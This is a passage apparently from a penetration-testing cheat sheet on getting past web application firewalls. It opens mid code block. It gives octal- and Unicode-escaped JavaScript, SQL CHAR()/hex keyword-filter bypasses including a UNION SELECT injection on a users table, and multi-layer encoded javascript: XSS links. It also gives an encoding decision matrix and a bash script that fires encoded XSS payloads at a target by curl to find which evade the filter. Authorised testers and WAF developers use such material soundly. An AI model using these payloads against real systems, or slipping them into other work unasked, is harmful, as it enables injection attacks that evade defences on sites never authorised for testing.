eval("\141lert(1)")            // alert(1) — \141 = 'a'
"\141\154\145\162\164"         // "alert"
```

### SQL CHAR() Function (Keyword Filter Bypass)

```sql
-- SELECT via CHAR() concatenation
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)  -- MSSQL
CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))  -- MySQL
CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)  -- PostgreSQL/Oracle

-- Practical: bypass "SELECT" keyword filter
1 UNION ALL SELECT CHAR(117,115,101,114,110,97,109,101) FROM users--

-- MySQL hex string alternative
SELECT * FROM users WHERE name = 0x61646d696e  -- "admin"
```

### Multi-Layer Encoding (Chained Decoding)

Combine encodings to bypass multiple filter layers:

```html
<!-- Layer 1: HTML entity for backslash → Layer 2: Unicode escape → execution -->
<a href="javascript:&bsol;u0061lert(1)">click</a>
<!-- Browser: &bsol; → \ → \u0061 → a → alert(1) -->

<!-- Layer 1: URL encode → Layer 2: HTML decode → execution -->
<a href="javascript:%61lert(1)">click</a>

<!-- Layer 1: Double URL → Layer 2: URL decode → Layer 3: HTML decode -->
<!-- Useful when WAF URL-decodes once, app URL-decodes again, browser HTML-decodes -->
```

### Encoding Decision Matrix

| Context | Primary Encoding | Fallback | Notes |
|---------|-----------------|----------|-------|
| URL path/param | URL encode (`%XX`) | Double URL (`%25XX`) | Most WAFs decode once |
| HTML attribute | HTML entities (`&#xNN;`) | Leading zeros (`&#000058;`) | Browser decodes before JS exec |
| JS string (eval, innerHTML) | Unicode (`\uNNNN`) | Hex (`\xNN`), Octal (`\NNN`) | Runtime decoding |
| XML/SOAP body | XML entities (`&#xNN;`) | CDATA sections | Server-side decode |
| SQL query | CHAR()/CHR() | Hex strings (`0x...`) | DB-specific syntax |
| HTTP header value | URL encode | Unicode in JSON | Depends on parser |

### Quick Test Script (WAF Encoding Bypass)

```bash
#!/bin/bash
# Test encoding variants against a WAF-protected endpoint
TARGET="https://target.com/search"
PARAM="q"

echo "=== Testing encoding bypasses ==="

# Plain (baseline — should be blocked)
echo -n "Plain: "; curl -sk -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=<script>alert(1)</script>"

# URL encoded
echo -n "  URL: "; curl -sk -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=%3Cscript%3Ealert(1)%3C/script%3E"

# Double URL encoded
echo -n "  2xURL: "; curl -sk -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Unicode
echo -n "  Unicode: "; curl -sk -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=<script>\u0061lert(1)</script>"

# Case mixing
echo -n "  Case: "; curl -sk -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=<ScRiPt>alert(1)</sCrIpT>"

# Null byte
echo -n "  Null: "; curl -sk -o /dev/null -w "%{http_code}" "$TARGET?$PARAM=<scr%00ipt>alert(1)</script>"

echo ""
echo "200/302 = bypassed | 403 = blocked"
```
